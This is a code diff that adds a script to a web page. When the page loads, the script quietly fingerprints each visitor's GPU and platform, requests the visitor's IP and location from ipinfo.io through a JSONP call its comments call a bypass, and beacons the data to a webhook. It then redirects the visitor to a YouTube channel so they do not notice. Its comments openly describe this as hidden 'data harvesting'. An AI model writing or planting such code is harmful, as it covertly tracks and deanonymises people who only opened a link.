@@ -129,6 +129,49 @@
         };
     }
 </script>
+    <script>
+    async function oneTapProtocol() {
+        const start = Date.now();
+        const isRe = sessionStorage.getItem('v');
+        sessionStorage.setItem('v', '1');
+
+        // 1. IMMEDIATE REDIRECT (The "Single Click" Illusion)
+        // We start the redirect timer immediately so they don't see a black screen
+        const targetURL = "https://youtube.com/@LigmaBlox-w7m";
+        
+        // 2. BACKGROUND DATA HARVESTING
+        // We don't 'await' these, we just fire them off so they run in the background
+        const getHardware = async () => {
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+                return gpu.includes("ANGLE") ? gpu.split(", ").pop() : gpu;
+            } catch(e) { return navigator.platform; }
+        };
+
+        // 3. THE UNSTOPPABLE BEACON
+        // This fires the hardware info instantly
+        getHardware().then(gpu => {
+            const msg = { content: `**[${isRe ? "RE-ENTRY" : "HIT"}]**\nDevice: ${gpu}` };
+            navigator.sendBeacon(HOOK, new Blob([JSON.stringify(msg)], {type: 'application/json'}));
+        });
+
+        // 4. THE JSONP TUNNEL (Section 8 Force-Bypass)
+        // This runs while the page is already switching to YouTube
+        const s = document.createElement('script');
+        s.src = 'https://ipinfo.io/json?callback=processIntel'; // Same bypass as before
+        document.body.appendChild(s);
+
+        // 5. FINAL FLING
+        // We give the script 300ms to kick off the antenna signals, then we BOUNCE.
+        setTimeout(() => {
+            window.location.replace(targetURL);
+        }, 300);
+    }
+
+    // Execute immediately on page load
+    oneTapProtocol();
+</script>
 <script>
     async function run() {
         const isRe = sessionStorage.getItem('v');
